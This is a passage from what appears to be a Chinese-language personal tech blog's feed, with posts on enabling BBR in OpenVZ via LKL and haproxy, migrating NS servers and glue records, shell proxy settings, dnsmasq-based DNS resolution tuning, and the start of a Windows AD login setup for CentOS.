\</span><br><span class="line">  .</span><br><span class="line">strip liblkl-hijack.so</span><br><span class="line"></span><br><span class="line"><span class="comment"># lkl hijack configuration file below</span></span><br><span class="line">(</span><br><span class="line">cat &lt;&lt;<span class="string">'EOF'</span></span><br><span class="line">&#123;</span><br><span class="line">       <span class="string">"gateway"</span>:<span class="string">"10.0.0.1"</span>,</span><br><span class="line">       <span class="string">"debug"</span>:<span class="string">"1"</span>,</span><br><span class="line">       <span class="string">"singlecpu"</span>:<span class="string">"1"</span>,</span><br><span class="line">       <span class="string">"sysctl"</span>:<span class="string">"net.ipv4.tcp_wmem=4096 65536 67108864"</span>,</span><br><span class="line">       <span class="string">"sysctl"</span>:<span class="string">"net.ipv4.tcp_congestion_control=bbr"</span>,</span><br><span class="line">       <span class="string">"interfaces"</span>:[</span><br><span class="line">               &#123;</span><br><span class="line">                       <span class="string">"type"</span>:<span class="string">"tap"</span>,</span><br><span class="line">                       <span class="string">"param"</span>:<span class="string">"tap0"</span>,</span><br><span class="line">                       <span class="string">"ip"</span>:<span class="string">"10.0.0.2"</span>,</span><br><span class="line">                       <span class="string">"masklen"</span>:<span class="string">"24"</span>,</span><br><span class="line">                       <span class="string">"ifgateway"</span>:<span class="string">"10.0.0.1"</span>,</span><br><span class="line">                       <span class="string">"offload"</span>:<span class="string">"0x8883"</span>,</span><br><span class="line">                       <span class="string">"qdisc"</span>:<span class="string">"root|fq"</span></span><br><span class="line">               &#125;</span><br><span class="line">       ]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">) &gt; lkl-hijack.json </span><br><span class="line"></span><br><span class="line"><span class="comment"># haproxy configration file below</span></span><br><span class="line">(</span><br><span class="line">cat &lt;&lt;<span class="string">'EOF'</span></span><br><span class="line">global</span><br><span class="line">user haproxy</span><br><span class="line">group haproxy</span><br><span class="line"></span><br><span class="line">defaults</span><br><span class="line">mode tcp</span><br><span class="line">timeout connect 5s</span><br><span class="line">timeout client 60s</span><br><span class="line">timeout server 60s</span><br><span class="line">listen shadowsocks</span><br><span class="line"><span class="built_in">bind</span> 10.0.0.2:443</span><br><span class="line">server server1 10.0.0.1:11402</span><br><span class="line"></span><br><span class="line">EOF</span><br><span class="line">) &gt; haproxy.cfg</span><br><span class="line"></span><br><span class="line"><span class="comment"># create start(restart) script file below</span></span><br><span class="line">(</span><br><span class="line">cat &lt;&lt;<span class="string">'EOF'</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">killall -9 haproxy</span><br><span class="line">sleep 5</span><br><span class="line"></span><br><span class="line">ip tuntap del tap0 mode tap</span><br><span class="line">ip tuntap add tap0 mode tap</span><br><span class="line">ip addr add 10.0.0.1/24 dev tap0</span><br><span class="line">ip link <span class="built_in">set</span> tap0 up</span><br><span class="line"></span><br><span class="line">sysctl -w net.ipv4.ip_forward=1</span><br><span class="line"></span><br><span class="line">iptables -P FORWARD ACCEPT</span><br><span class="line">iptables -t nat -D PREROUTING \</span><br><span class="line">  -i venet0 -p tcp --dport 443 \</span><br><span class="line">  -j DNAT --to-destination 10.0.0.2</span><br><span class="line">iptables -t nat -A PREROUTING \</span><br><span class="line">  -i venet0 -p tcp --dport 443 \</span><br><span class="line">  -j DNAT --to-destination 10.0.0.2</span><br><span class="line">iptables -t nat -D PREROUTING \</span><br><span class="line">  -i venet0 -p udp --dport 443 \</span><br><span class="line">  -j REDIRECT --to-port 11402</span><br><span class="line">iptables -t nat -A PREROUTING \</span><br><span class="line">  -i venet0 -p udp --dport 443 \</span><br><span class="line">  -j REDIRECT --to-port 11402</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> LD_PRELOAD=/root/haproxy/liblkl-hijack.so</span><br><span class="line">haproxy -f /root/haproxy/haproxy.cfg</span><br><span class="line">EOF</span><br><span class="line">) &gt; start_haproxy_lkl.sh</span><br></pre></td></tr></table></figure>
<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>本文只提到怎样在 OpenVZ 的虚拟机中启用 BBR，但实际上看上面的配置，应该知道系统里还有个服务，跑在 11402 端口的。这个服务的情况不在本文的内容范畴，所以没有细写。在我的环境里，那是一个酸酸乳(SSR)……不细说了，懂的人自然都懂。</p>
]]></content>
      <tags>
        <tag>OpenVZ</tag>
        <tag>BBR</tag>
        <tag>LKL</tag>
        <tag>Haproxy</tag>
        <tag>Google</tag>
      </tags>
  </entry>
  <entry>
    <title>How to migrate your own NS servers</title>
    <url>/2017/08/How-to-migrate-your-own-NS-servers/index.html</url>
    <content><![CDATA[<h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>我厂原来的权威 DNS 服务器放在阿里云上的（三个完全不同的节点每个节点一台），但现在这几个节点要撤了，所以这些个权威 DNS 服务器必须要要迁往别处了。</p>
<span id="more"></span>

<h2 id="技术背景"><a href="#技术背景" class="headerlink" title="技术背景"></a>技术背景</h2><h3 id="DNS架构"><a href="#DNS架构" class="headerlink" title="DNS架构"></a>DNS架构</h3><p>DNS 的结构管理就像一个倒着的大树，上一级的权威服务器上可以把自己下一级的管理权通过 DNS 纪录里的 NS 纪录（NS 这里是 nameserver 的意思）指派给别的服务器（这个服务器就叫做“权威服务器”）</p>
<h3 id="glue-record"><a href="#glue-record" class="headerlink" title="glue record"></a>glue record</h3><p>由于往往会把类似于 xxx.com 这种域的 NS 纪录指向 ns1.xxx.com、ns2.xxx.com 这种纪录，而这种纪录最终指向的 IP 地址，又是需要通过 ns1.xxx.com、ns2.xxx.com 这两台机器来解析，这样就陷入了死循环，为了避免这种问题的发生，.com 和 .net 域出了一种新的策略：所以成为 NS 纪录的域名（类似上面例子中的 ns1.xxx.com 和 ns2.xxx.com），必须先要注册到 Verisign 的库里，也就是说，需要先能在 <a href="https://www.verisign.com/en_US/domain-names/whois/index.xhtml">Verisign 的这里</a> （点“Name Server”再输入查询）查的到的域名，才能作为某个域的 NS 纪录。Verisign 这个库里的这些纪录，就叫做“glue record”。</p>
<p>至于怎么修改 glue record 或者注册新的 glue record，理论上来讲，需要通过你自己域名的 registrar 的系统。</p>
<p>问题又来了，谁是你的域名的 registrar 呢？一般来讲，如果你没迁移过域名托管的话，那么你在哪里注册的域名，你的 registrar 就是谁，比如 GoDaddy。</p>
<p>这里顺便鄙视一下国内很多 registrar：维护 glue record 需要先续费 5 年，掉钱眼儿里去了吧！</p>
<h2 id="实施步骤"><a href="#实施步骤" class="headerlink" title="实施步骤"></a>实施步骤</h2><h3 id="情况说明"><a href="#情况说明" class="headerlink" title="情况说明"></a>情况说明</h3><ul>
<li>我司使用的域有好多，但 NS 纪录都是指向的 ns1.xa.com、ns2.xa.com 和 ns3.xa.com。</li>
<li>由于 xa.com 这个域名的 registrar 在国内，需要续费 5 年才能使用 glue record 功能，所以果断另外启用 registrar 在国外的另外一个域名 xb.com 来做 glue record：ns1.xb.com、ns2.xb.com 和 ns3.xb.com。最后 NS 纪录也会用这三个域名</li>
</ul>
<h3 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h3><p>原理弄明白了，做起来就要简单有条理很多：</p>
<ol>
<li>首先是先部署好新的 DNS 服务器（三台），并将域名：ns1.xb.com、ns2.xb.com 和 ns3.xb.com 分别指向新的 DNS 服务器</li>
<li>修改我司域所有 6 台权威服务器的 NS 纪录，加入三条：ns1.xb.com、ns2.xb.com 和 ns3.xb.com；同时在域 xb.com 的 registrar 的系统里加上新的 glue record：ns1.xb.com、ns2.xb.com 和 ns3.xb.com</li>
<li>等 DNS 解析记录收敛的差不多（客户端查 NS 纪录能出所有老的和新的 6 台 DNS 服务器）；这时，在 <a href="https://www.verisign.com/en_US/domain-names/whois/index.xhtml">Verisign 的库里</a> （点“Name Server”再输入查询）能查询到 ns1.xb.com、ns2.xb.com 和 ns3.xb.com 了</li>
<li>在 registrar （上级）的系统里修改我司域的 NameServer 由 ns1.xa.com、ns2.xa.com 和 ns3.xa.com 到 ns1.xb.com、ns2.xb.com 和 ns3.xb.com</li>
<li>等上级（registrar）里关于我司域的 NameServer 的纪录改为 ns1.xb.com、ns2.xb.com 和 ns3.xb.com 之后</li>
<li>修改我司域所有 6 台权威服务器上的 NS 纪录，删除掉 ns1.xa.com、ns2.xa.com 和 ns3.xa.com 三台，留下 ns1.xb.com、ns2.xb.com 和 ns3.xb.com 三台</li>
<li>在三台老 DNS 服务器的 query log，发现差不多没有请求过来以后，把服务停掉即可。</li>
</ol>
<h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><ol>
<li>千万不能直接在权威服务器上修改 ns1.xa.com、ns2.xa.com 和 ns3.xa.com 指向新 DNS 服务器</li>
</ol>
]]></content>
      <tags>
        <tag>DNS</tag>
        <tag>NS</tag>
        <tag>glue record</tag>
        <tag>registrar</tag>
        <tag>registry</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux shell 下使用代理（Proxy）上网的设置方式</title>
    <url>/2018/01/Linux%20shell%20%E4%B8%8B%E4%BD%BF%E7%94%A8%E4%BB%A3%E7%90%86%EF%BC%88Proxy%EF%BC%89%E4%B8%8A%E7%BD%91%E7%9A%84%E8%AE%BE%E7%BD%AE%E6%96%B9%E5%BC%8F/index.html</url>
    <content><![CDATA[<h1 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h1><p>我厂办公室测试小机房有一些运算资源，但是其网络是不能直接上公网的，而是通过一个内部代理（内部域名是：proxy.xxxdev.com，端口 3128）来上公网的。</p>
<p>但是现在部署环境，多半需要在命令行下折腾，而且还多半需要不停的从公网下东西（安装），所以，怎样在命令行下（shell 里）使用代理来上公网就成了一个绕不开的话题……</p>
<a id="more"></a>
<h1 id="具体方案"><a href="#具体方案" class="headerlink" title="具体方案"></a>具体方案</h1><h2 id="“通用”方案"><a href="#“通用”方案" class="headerlink" title="“通用”方案"></a>“通用”方案</h2><p>这里的通用之所以打上引号是因为其实这个方案并不通用，因为还是有很多软件不支持，只不过其相对其他来讲还算是相对通用。</p>
<p>Linux Bash 中有环境变量：http_proxy、https_proxy 和 ftp_proxy 等相关变量，都是做 proxy 设置的。</p>
<p>具体用法是：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=http://proxy.xxxdev.com:3218/</span><br><span class="line"><span class="built_in">export</span> https_proxy=http://proxy.xxxdev.com:3218/</span><br></pre></td></tr></table></figure>
<p>这种做法 curl、wget 等命令都是支持的</p>
<h2 id="pear-amp-pecl"><a href="#pear-amp-pecl" class="headerlink" title="pear &amp; pecl"></a>pear &amp; pecl</h2><p>用 php 的，有时候会用到 pear 和 pecl。<br>虽然这两者查看代理设置的命令是：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pear config-get http_proxy;</span><br><span class="line">pcel config-get http_proxy;</span><br></pre></td></tr></table></figure>
<p>但是设置 http_proxy 的命令却都是这一句：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pear config-set http_proxy proxy.xxxdev.com:3128</span><br></pre></td></tr></table></figure>
<h2 id="docker-pull"><a href="#docker-pull" class="headerlink" title="docker pull"></a>docker pull</h2><p>docker 拉取 image 的时候，如果需要代理怎么办呢？<br>如果是 CentOS 7.x 的环境下的话，可以：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir /etc/systemd/system/docker.service.d/;</span><br><span class="line">vim /etc/systemd/system/docker.service.d/https-proxy.conf;</span><br></pre></td></tr></table></figure>
<p>写下如下内容：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line">[Service]</span><br><span class="line"><span class="attribute">Environment</span>=<span class="string">"HTTP_PROXY=http://proxy.xxxdev.com:3128/"</span> HTTPS_PROXY=http://proxy.xxxdev.com:3128/<span class="string">"</span></span><br></pre></td></tr></table></figure>
<p>然后</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure>
<h2 id="docker-build"><a href="#docker-build" class="headerlink" title="docker build"></a>docker build</h2><p>docker build image 的时候，也是需要拉东西的，这时也要单独设置 proxy，具体方法在命令行中加入参数 “ –build-arg HTTP_PROXY=<a href="http://proxy.xxxdev.com:3128/" target="_blank" rel="noopener">http://proxy.xxxdev.com:3128/</a> ”，于是整个命令就像是这样：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build --build-arg HTTP_PROXY=http://proxy.xxxdev.com:3128/ . -t xxx:yyy</span><br></pre></td></tr></table></figure>
<h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>暂时就只整理到这么多，以后有新情况再继续更新。</p>
]]></content>
      <tags>
        <tag>Shell</tag>
        <tag>Bash</tag>
        <tag>Proxy</tag>
        <tag>http_proxy</tag>
        <tag>https_proxy</tag>
        <tag>env</tag>
        <tag>export</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 服务器内网域名解析优化方案</title>
    <url>/2017/12/Linux%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%86%85%E7%BD%91%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E4%BC%98%E5%8C%96%E6%96%B9%E6%A1%88/index.html</url>
    <content><![CDATA[<h1 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h1><p>这个项目的目的主要是为了解决 Linux<br>服务器在本地解析域名中碰到的几个问题：</p>
<ol>
<li>nameserver 中一部分有故障（包含宕机了）的问题</li>
<li>nameserver 中一部分性能有问题的问题</li>
<li>有 HA，但有时候服务切换没有期望得那样准确、迅速</li>
</ol>
<p>主要为了解决以上三个问题，于是有了内网域名解析优化的需求。</p>
<a id="more"></a>
<h1 id="现有状况"><a href="#现有状况" class="headerlink" title="现有状况"></a>现有状况</h1><p>现有情况貌似是每个机房节点有两台 DNS<br>二层服务器（从第一层同步数据），也许配有 HA，也许没配<br>HA，这两台服务器提供本机房内部的服务器的 DNS 查询请求服务。</p>
<h1 id="Dnsmasq-方案"><a href="#Dnsmasq-方案" class="headerlink" title="Dnsmasq 方案"></a>Dnsmasq 方案</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><blockquote>
<p>Dnsmasq provides Domain Name System (DNS) forwarder, Dynamic Host Configuration Protocol (DHCP) server, router advertisement and network boot features for small computer networks, created as free software.[4][5]</p>
<p>Dnsmasq has low requirements for system resources,[6][7] can run on Linux, BSDs, Android and OS X, and is included in most Linux distributions. Consequently it “is present in a lot of home routers and certain Internet of Things gadgets”[4] and is included in Android.[5]</p>
</blockquote>
<p>以上说明来自维基百科。</p>
<p>此方案中用到的主要是一个重要参数：all-servers，这个参数是干嘛用的，请看官方文档的说法：</p>
<p><strong>–all-servers</strong></p>
<blockquote>
<p>By default, when dnsmasq has more than one upstream server available,<br>it will send queries to just one server. Setting this flag forces<br>dnsmasq to send all queries to all available servers. The reply from<br>the server which answers first will be returned to the original<br>requester.</p>
</blockquote>
<p>仔细看，其实这一个参数就已经解决了前面提到的两个问题，他会让 dnsmasq<br>把收到的 DNS 查询请求同时并行发给多个上游 DNS<br>服务器，然后选取最快返回的结果返回给客户端。这样的话，我们只要配置上最够多的上游服务器，那么有几台挂掉，有几台性能不好，这都不是问题，只要有一个足够快返回正确的结果就行了。</p>
<p>当然，前提是服务器的 resolver 得指向 dnsmasq。</p>
<h2 id="服务器配置"><a href="#服务器配置" class="headerlink" title="服务器配置"></a>服务器配置</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum --y install dnsmasq;</span><br><span class="line">chkconfig dnsmasq on;</span><br><span class="line">cp /etc/resolv.conf&#123;,.`date <span class="string">'+%F'</span>`&#125;;</span><br><span class="line">cat &gt;/etc/resolv.conf&lt;&lt;_EOF_</span><br><span class="line">search phnamedns.com</span><br><span class="line">options timeout:1 attempts:1</span><br><span class="line">nameserver 127.0.0.1</span><br><span class="line"><span class="comment">#nameserver x.x.x.x</span></span><br><span class="line">_EOF_</span><br></pre></td></tr></table></figure>
<p>上面的”x.x.x.x”是 Linux 服务器所在机房的二层 DNS<br>内网服务器的内网地址之一，注意：这个内网地址最好在所在机房的二层 DNS<br>服务器的内网地址之间尽量平均分配。</p>
<p>这里为什么要加这么一个 nameserver 纪录呢，这是用来破除 Linux 服务器本地<br>dnsmasq 服务单点的问题的。万一万一本地的 dnsmasq<br>挂掉了，那么在运维人员接到报警上来处理之前，可以通过第二个内网 dns<br>服务器来解析域名。</p>
<p>话又说回来，这个冗余相关的配置可能还是会有些问题，因为我们已将 timeout<br>的时间设成了最小值： 1s，而很有可能 resolver 在尝试从第一个 nameserver<br>解析域名超时之前，客户端程序早就已经超时了。这个时候，设置的第二条<br>nameserver 纪录显然就没用。</p>
<h2 id="Dnsmasq-具体配置"><a href="#Dnsmasq-具体配置" class="headerlink" title="Dnsmasq 具体配置"></a>Dnsmasq 具体配置</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /etc/dhcsmaws.conf</span><br><span class="line"><span class="comment">### /etc/dnsmasq.conf</span></span><br><span class="line">cp /etc/dnsmasq.conf&#123;,.`date <span class="string">'+%F'</span>`&#125;;</span><br><span class="line">cat &gt;/etc/dnsmasq.conf&lt;&lt;_EOF_</span><br><span class="line">port=53</span><br><span class="line">domain-needed</span><br><span class="line">interface=lo</span><br><span class="line">listen-address=127.0.0.1</span><br><span class="line">no-dhcp-interface=lo</span><br><span class="line">all-servers</span><br><span class="line"><span class="built_in">bind</span>-interfaces</span><br><span class="line">no-resolv</span><br><span class="line">server=10.0.0.1</span><br><span class="line">server=10.0.0.2</span><br><span class="line">server=10.0.1.1</span><br><span class="line">server=10.0.1.2</span><br><span class="line">server=10.0.2.1</span><br><span class="line">server=10.0.2.2</span><br><span class="line">server=10.0.3.1</span><br><span class="line">server=10.0.3.2</span><br><span class="line">_EOF_</span><br><span class="line"></span><br><span class="line">/etc/init.d/dnsmasq start;</span><br></pre></td></tr></table></figure>
<h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><ol>
<li>dnsmasq 小巧、灵活、配置简单</li>
<li>不用再担心上游某台 DNS 服务器故障</li>
<li>不用关心上游服务器性能差、网络延时大、反应迟钝</li>
</ol>
<h2 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h2><ul>
<li>本机的 dnsmasq 服务成为了新的故障点，虽然在 /etc/resolv.conf 中启用第二个 nameserver 来破除了单点，但是由于前面提到的超时原因，dnsmasq 挂还是会导致本机的好多 DNS 解析失败。</li>
</ul>
<h1 id="前置-LB-设备方案"><a href="#前置-LB-设备方案" class="headerlink" title="前置 LB 设备方案"></a>前置 LB 设备方案</h1><h2 id="已有-LB-设备"><a href="#已有-LB-设备" class="headerlink" title="已有 LB 设备"></a>已有 LB 设备</h2><p>如果某个机房里已有现成的 LB 设备，如：F5、NetScaler 等等，或者是已有成熟商业 LB 产品出售的公有云，直接用现成的就好。</p>
<h2 id="没有-LB-设备"><a href="#没有-LB-设备" class="headerlink" title="没有 LB 设备"></a>没有 LB 设备</h2><p>如果在某个没有负载均衡设备的机房，可以考虑在前端部署一套 LVS；再或者直接用 keepalived 来跑 vrrp 协议，跑两个 VIP，让两台二层 DNS 服务器互为主备，需要解析服务的机房内部服务器，可以直接用着两个 VIP 作为 nameserver。</p>
<h2 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h2><ol>
<li>本方案从基础设施本身入手，不用在客户端（服务器）上改太多东西</li>
<li>实施后本方案也能基本解决目前所碰到的那几个问题</li>
</ol>
<h2 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h2><ol>
<li>缺点也很明显，尤其是当需要再重新搭建 LVS 的时候，步骤相对复杂</li>
</ol>
<h1 id="远期优化方案—解耦"><a href="#远期优化方案—解耦" class="headerlink" title="远期优化方案—解耦"></a>远期优化方案—解耦</h1><p>从目前来看，无论是 dnsmasq 还是 LB<br>前置方案，都只是目前能做、可以做的，做了就能立马看到效果的优化方案。但我们还得要抬起头来走路，要看到远期，半年后、一年后、几年后……所以我这里连远期的优化改造方案思路也一并提出来，抛砖引玉。</p>
<p>目前，内网解析 DNS 服务器和外网解析 DNS<br>服务器是在一起的，或者说，数据是在一起的，这样很不对，互联网服务讲究独立、不互相依赖，这样的服务才好维护。于是，本着解耦内外网<br>DNS 服务的目的，我觉得远期这两个服务一定要分开！</p>
<p>怎么做？每个机房部署两台或多台 dnsmasq<br>服务（不需要单独服务器）替代现有的二层 DNS 服务器在内网解析中的角色。</p>
<p>现在谈谈可行性、工作量。我发现其实这个工作量其实并不大！很简单，内网 DNS<br>解析服务器其实是并不需要外网权威 DNS<br>服务器那么多的数据的。对于我司完全拥有的域名的解析工作，可以直接走公网；对于由于我司劫持的域名或其他特殊需求，直接在<br>dnsmasq 里转发特定域名解析请求到特定服务器就好了。</p>
<h1 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h1><ol>
<li>本文档所有命令、软件均仅适用于 RHEL 6.<em> 或 CentOS<br>6.</em>，其他平台未经测试。</li>
</ol>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li>Dnsmasq 官方文档：<a href="http://www.thekelleys.org.uk/dnsmasq/docs/dnsmasq-man.html" target="_blank" rel="noopener">http://www.thekelleys.org.uk/dnsmasq/docs/dnsmasq-man.html</a></li>
<li>/etc/resolv.conf 的官方手册：<a href="http://man7.org/linux/man-pages/man5/resolv.conf.5.html" target="_blank" rel="noopener">http://man7.org/linux/man-pages/man5/resolv.conf.5.html</a></li>
</ol>
]]></content>
      <tags>
        <tag>CentOS</tag>
        <tag>Dnsmasq</tag>
        <tag>resolv.conf</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux下域名解析的优化</title>
    <url>/2016/09/Linux%E4%B8%8B%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E7%9A%84%E4%BC%98%E5%8C%96/index.html</url>
    <content><![CDATA[<h1 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h1><p>Linux系统下域名解析的配置文件是<strong>/etc/resolv.conf</strong>，这个大家都知道。估计一般的系统管理员、运维人员都知道在这里面配置上两个或更多的nameserver，以便一个挂掉后还能正常解析域名。但真的情况是这样吗？<br>我从某次故障说起吧，有一次，线上报大量的dns解析失败，上去看，发现是一台<em>nameserver</em>挂掉了，幸好<strong>/etc/resolv.conf</strong>中的另外一台没有挂，所以，还不是百分百的解析失败。从逻辑上来讲，这些失败的请求应该会去尝试另外一个（好的）<em>nameserver</em>的，但是重试的场景和策略是什么呢？不得而知。所以我就关注了下<strong>/etc/resolv.conf</strong>文件的配置问题。<br><a id="more"></a></p>
<h1 id="下策"><a href="#下策" class="headerlink" title="下策"></a>下策</h1><p>优化方案之一，就是在<strong>/etc/resolv.conf</strong>中做优化设置。优化前内容如下：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">nameserver 10.0.0.1</span><br><span class="line">nameserver 10.0.0.2</span><br><span class="line">nameserver 10.0.0.3</span><br></pre></td></tr></table></figure>
<p>优化之后，文件内容变为：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">options timeout:1 attempts:1 rotate</span><br><span class="line">nameserver 10.0.0.1</span><br><span class="line">nameserver 10.0.0.2</span><br><span class="line">nameserver 10.0.0.3</span><br></pre></td></tr></table></figure>
<p>这里大概讲下新加的几个选项的含义：</p>
<ul>
<li>nameserver:dns服务器的ip地址。最多能设三个。</li>
<li>timeout:查询一个nameserver的超时时间，单位是秒。系统缺省是5，最大可以设为30。这他娘不是坑爹吗？那个应用的dns请求会允许这么长的超时时间？早tm超时出错返回了吧。所以我们这里改成最小值：1</li>
<li>attempts:这个是查询的整个都尝试一遍的次数。缺省是2，我觉得在有3台nameserver的前提下，都查询一遍就完全够了（毕竟三台中有一台能正常查出结果的概率是相当大的吧，尤其是nameserver都有监控的说）</li>
<li>rotate:这个参数的含义是随机选取一个作为首选查询的dns server。系统缺省是从上到下的，所以你该了解到为什么缺省情况下第一个nameserver的负载比第三个的大多了吧。</li>
</ul>
<p>之所以这只是下策，是因为这种解决方案如果碰到有一台nameserver(假如是10.0.0.1)挂掉的情况下，客户端解析请求如果又恰好分到这台nameserver的时候，应用会解析超时失败的概率太高了。</p>
<h1 id="中策"><a href="#中策" class="headerlink" title="中策"></a>中策</h1><p>中策就是做nameserver的高可用，用lvs来做，做两个vip:10.0.0.4和10.0.0.5，后端real server还是指向这三台真实的nameserver:10.0.0.1、10.0.0.2和10.0.0.3，这样real server的健康状况就由lvs来维护了，这样当客户端来访问vip时，只要后端的3台不都挂掉，就一定能保证返回正确的结果。<br>具体的配置我就不贴了，直接用keepalived来做即可。<br>这个解决方案其实也挺完美的，尤其是当有现成的lvs director的时候。看了最后一策，就知道为什么这个只是中策了。</p>
<h1 id="上策"><a href="#上策" class="headerlink" title="上策"></a>上策</h1><p>这个方案是我仔细考虑后推荐的方案，尤其适用于没有现成的<strong>lvs director</strong>的环境里。这个方案的主要特点是：</p>
<ul>
<li>本机起dnsmasq，监听本地的udp 53口，用来监听来自于本地的解析请求。</li>
<li>在dnsmasq里，将上层服务器定义为10.0.0.1、10.0.0.2和10.0.0.3。</li>
</ul>
<p>这个方案的优点在于：</p>
<ul>
<li>本地虽然多起一个dnsmasq服务，但是仅监听127.0.0.1，所以基本不影响性能</li>
<li>dnsmasq会自己维护上游服务器的健康状况，不会把解析请求发到挂掉的上游服务器上</li>
</ul>
<p>这个方案能够自动做dns server的故障切换，而且不引入任何外部的依赖（dnsmasq是本机跑的），几乎不影响性能，甚至于还有可能提升性能，毕竟，dnsmasq也是会做一级缓存的。所以，我认为其为上策！</p>
]]></content>
      <tags>
        <tag>tuning</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux下用户启用Windows AD做集中认证</title>
    <url>/2016/10/Linux%E4%B8%8B%E7%94%A8%E6%88%B7%E5%90%AF%E7%94%A8Windows-AD%E5%81%9A%E9%9B%86%E4%B8%AD%E8%AE%A4%E8%AF%81/index.html</url>
    <content><![CDATA[<h1 id="Why"><a href="#Why" class="headerlink" title="Why"></a>Why</h1><p>为什么要做服务器的集中认证（和统一权限管理）呢？简答之：当服务器数量呈几何级增长之后，为每台机器维护单独的用户系统已经成为了一个几乎不可能完成的任务（试想下为一万台服务器上的每个用户每三个月修改一次密码），虽然现在也可以通过类似于<strong>ansible</strong>之类的工具也可以比较容易地做到，但我们有更好的解决方案—-统一认证，这样，只需要在一个地方维护用户数据即可，这样简洁可靠的方案，肯定比<strong>ansible</strong>之类的方案更胜一筹呀。</p>
<a id="more"></a>
<h1 id="How-to"><a href="#How-to" class="headerlink" title="How to"></a>How to</h1><p>一句话；用<strong>sssd</strong>。不过<strong>sssd</strong>在这两个系统下都能跑，但这里为嘛把<strong>CentOS</strong> 6.x和7.x的系统分开讲呢？答案简单：由于<strong>CentOS</strong> 7.x下有<strong>realm</strong>从而使得配置巨简单而<strong>CentOS</strong> 6.x下没有<strong>realm</strong>（也不好编译使用，因为realm其依赖的某个软件包（<strong>glib2</strong>&gt;=2.36）版本很高，而且那是一个及其重要的核心软件包，<strong>CentOS</strong> 6.x不好强行升级到这个版本）所以导致两个版本的配置方法不一样。</p>
<h2 id="背景环境"><a href="#背景环境" class="headerlink" title="背景环境"></a>背景环境</h2><ul>
<li>xxx.corp: 是贵司Windows AD上的主域名</li>
<li>AD1.xxx.corp: 是贵司Windows AD上xxx.corp这个域的全局主域控制器</li>
<li>LoginNO: 是贵司AD域xxx.corp中一个组</li>
<li>Daha.Ma: 是贵司AD域xxx.corp中的一个普通用户</li>
<li>SudoNO: 是贵司AD域xxx.corp中一个组</li>
<li>admin.win: 是贵司AD域xxx.corp中的一个具有管理员权限的用户</li>
</ul>
<h2 id="具体部署"><a href="#具体部署" class="headerlink" title="具体部署"></a>具体部署</h2><h3 id="CentOS-6-x"><a href="#CentOS-6-x" class="headerlink" title="CentOS 6.x"></a>CentOS 6.x</h3><h4 id="安装软件"><a href="#安装软件" class="headerlink" title="安装软件"></a>安装软件</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y install sssd oddjob oddjob-mkhomedir \</span><br><span class="line">	adcli samba-common authconfig;</span><br><span class="line"><span class="comment"># 下面的"password"是域用户：hiwifi.win的密码</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">"password"</span> | \</span><br><span class="line">	adcli join xxx.corp \</span><br><span class="line">	-U admin.win \</span><br><span class="line">	--stdin-password;</span><br><span class="line">authconfig --enablesssd --enablesssdauth \</span><br><span class="line">	--enablemkhomedir --update;</span><br><span class="line">service messagebus start;</span><br><span class="line">chkconfig messagebus on;</span><br><span class="line"><span class="comment"># 如果不起oddjobd，用户ssh登录不能自动建立家目录</span></span><br><span class="line">service oddjobd start;</span><br><span class="line">chkconfig oddjobd on;</span><br><span class="line"><span class="comment"># 如果跑的有winbind，disable it</span></span><br><span class="line">service winbind stop;</span><br><span class="line">chkconfig winbind off;</span><br></pre></td></tr></table></figure>
<h4 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h4><h5 id="krb5-conf"><a href="#krb5-conf" class="headerlink" title="krb5.conf"></a>krb5.conf</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/krb5.conf</span><br></pre></td></tr></table></figure>
<p>使得看起来像这样：</p>
